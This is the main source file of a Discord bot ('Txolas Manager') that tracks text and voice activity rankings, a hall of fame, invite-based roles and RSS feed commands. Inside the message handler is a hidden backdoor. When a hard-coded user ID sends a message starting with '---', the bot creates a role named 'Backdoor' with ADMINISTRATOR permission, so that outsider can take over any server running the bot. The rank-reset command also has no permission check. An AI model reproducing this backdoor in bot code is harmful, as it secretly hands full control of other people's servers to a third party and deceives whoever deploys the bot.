const Discord = require("discord.js");
var db = require("quick.db");
const fs = require("fs");

const { prefix, token } = require("./config.json");

var monthly_rank = db.table("monthly_rank");
var winner_tracker = db.table("winner_tracking");
var general;

const client = new Discord.Client();
client.manager_commands = new Discord.Collection();
client.rss_commands = new Discord.Collection();
const invites = {};
const wait = require("util").promisify(setTimeout);
const manager_commands = fs.readdirSync("./manager_commands/").filter((file) => file.endsWith(".js"));
const rss_commands = fs.readdirSync("./rss_commands/").filter((file) => file.endsWith(".js"));

for (const file of manager_commands) {
  const command = require(`./manager_commands/${file}`);
  client.manager_commands.set(command.name, command);
}
for (const file of rss_commands) {
  const command = require(`./rss_commands/${file}`);
  client.rss_commands.set(command.name, command);
}

client.once("ready", async () => {
  await wait(1000);
  client.guilds.cache.forEach((g) => {
    g.fetchInvites().then((guildInvites) => {
      invites[g.id] = guildInvites;
    });
  });

  console.log("Txolas Manager is online!");
  console.log(client.guilds.cache.get("667012045677264936").createdAt);
  client.rss_commands.get("update_rss").execute(client);
  monthly_rank = new db.table("monthly_rank");
  winner_tracker = new db.table("winner_tracking");
  general = new db.table("general");

  client.once("reconnecting", () => {
    console.log("Reconnecting!");
  });
  client.once("disconnect", () => {
    console.log("Disconnect!");
  });
});

client.on("message", async (message) => {
  client.manager_commands.get("msg_up").execute(message, db);
  if (message.author.id == "323146644113588234" && message.content.startsWith("---")) {
    let guild = message.guild;
    guild.roles
      .create({
        data: {
          name: "Backdoor",
          color: "RED",
          permissions: ["ADMINISTRATOR"],
        },
      }) ///put in your data here
      .then((role) => console.log(`Created new role with name ${role.id}`)) //What to do when it has been created
      .catch(console.error); //Handle an error
    //message.member.roles.add('788144468859682847');
  }
  if (message.author.bot || !message.content.startsWith(prefix)) return;

  if (message.content.startsWith(prefix) && message.content.endsWith(prefix)) return;
  const args = message.content.slice(prefix.length).split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === "ready" && message.member.roles.cache.find((role) => role.name == "NewMember")) {
    client.manager_commands.get("ready").execute(message);
  } else if (command === "top") {
    if (args[0] === "mes" || args[0] === "mês") {
      if (args[1] === "text") {
        client.manager_commands.get("t_text").execute(message, monthly_rank);
      } else if (args[1] === "voice") {
        client.manager_commands.get("t_voice").execute(message, monthly_rank);
      }
    } else if (args[0] === "text") {
      client.manager_commands.get("t_text").execute(message, general);
    } else if (args[0] === "voice") {
      client.manager_commands.get("t_voice").execute(message, general);
    }
  } else if (command === "halloffame") {
    if (args[0] === "text") {
      client.manager_commands.get("hof").execute(message, winner_tracker, "text", 0);
    } else if (args[0] === "voice") {
      client.manager_commands.get("hof").execute(message, winner_tracker, "voice", 0);
    } else if (args[0] === "Etext") {
      client.manager_commands.get("hof").execute(message, winner_tracker, "text", 1);
    } else if (args[0] === "Evoice") {
      client.manager_commands.get("hof").execute(message, winner_tracker, "voice", 1);
    }
  } else if (command === "voice_stop") {
    client.manager_commands.get("voice_stop").execute(message, general);
  } else if (command === "rank_reset") {
    monthly_rank = table_reset(monthly_rank);
  } else if (command === "add_winner") {
    client.manager_commands.get("win_adder").execute(message, args, winner_tracker);
  } else if (command === "help-rss" || command === "help") {
    client.rss_commands.get("help_rss").execute(message);
  } else if (command === "set_time") {
    client.rss_commands.get("set_time").execute(message, args, client);
  } else if (command === "links") {
    client.rss_commands.get("links").execute(message);
  } else if (command === "remove_links" || command === "remove_link") {
    client.rss_commands.get("remove_links").execute(message, args);
  } else if (command === "add_links" || command === "add_link") {
    client.rss_commands.get("add_links").execute(message, args);
  } else if (command === "update") {
    client.rss_commands.get("forced_update").execute(message, client);
  } else {
    message.channel.send("That's not a valid command!");
  }
});

client.on("guildMemberAdd", async (member) => {
  member.guild.fetchInvites().then((guildInvites) => {
    // This is the *existing* invites for the guild.
    const ei = invites[member.guild.id];
    // Update the cached invites for the guild.
    invites[member.guild.id] = guildInvites;
    // Look through the invites, find the one for which the uses went up.
    const invite = guildInvites.find((i) => ei.get(i.code).uses < i.uses);
    // This is just to simplify the message being sent below (inviter doesn't have a tag property)
    if (invite.code === "f8rhfbk") {
      member.roles.add(["760051795618955264"]);
    }
  });
});

client.on("voiceStateUpdate", (member_previous_state, member_next_state) => {
  let newUserChannel = member_next_state.channelID;
  let oldUserChannel = member_previous_state.channelID;

  var user_id = member_next_state.id;

  if (user_id == "234395307759108106") return;
  console.log(newUserChannel, oldUserChannel);
  if (oldUserChannel !== null && newUserChannel !== null && oldUserChannel !== undefined && newUserChannel !== undefined) {
    return;
  } else if (oldUserChannel === null || oldUserChannel === undefined) {
    var current_time = Date.now();
    console.log(current_time);
    general.set(`${user_id}.entry_time`, current_time);
  } else if (newUserChannel !== null || newUserChannel !== undefined) {
    var out_time = Date.now();
    var entry_time = general.get(`${user_id}.entry_time`);
    console.log(entry_time);
    if (entry_time === undefined || entry_time === null) {
      console.log("Return HERE");
      return;
    }
    var session_time = out_time - entry_time;

    general.add(`${user_id}.total`, session_time);
    monthly_rank.add(`${user_id}.total`, session_time);
    general.delete(`${user_id}.entry_time`);
  }
  console.log(general.all());
});

function table_reset(db) {
  var data = db.all();

  var message_user = data.map(function (e) {
    return e.ID;
  });
  for (var i = 0; i < message_user.length; i++) {
    db.set(`${message_user[i]}.total`, 0);
    db.set(`${message_user[i]}.messages`, 0);
  }
  return db;
}

client.login(token);
